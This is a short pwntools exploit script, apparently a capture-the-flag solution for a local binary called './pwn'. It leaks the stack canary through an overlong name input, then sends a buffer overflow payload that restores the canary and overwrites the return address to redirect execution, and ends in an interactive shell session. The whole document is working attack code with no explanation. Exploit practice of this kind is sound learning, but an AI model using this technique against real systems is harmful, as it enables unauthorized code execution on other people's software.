from pwn import *
context(arch='amd64', os='linux', log_level='debug')
elf=ELF("./pwn")
s=process("./pwn")

s.sendafter(b"Ur name plz?\n",b"a"*0x19)
s.recvuntil(b"a"*0x19)
canary=u64(b"\x00"+s.recv(7))
success(hex(canary))
s.sendafter(b"right?",b"Y")
s.sendafter(b"plz.\n",flat([
 b"a"*0x18,canary,0x404500,0x401231
]))
s.interactive()
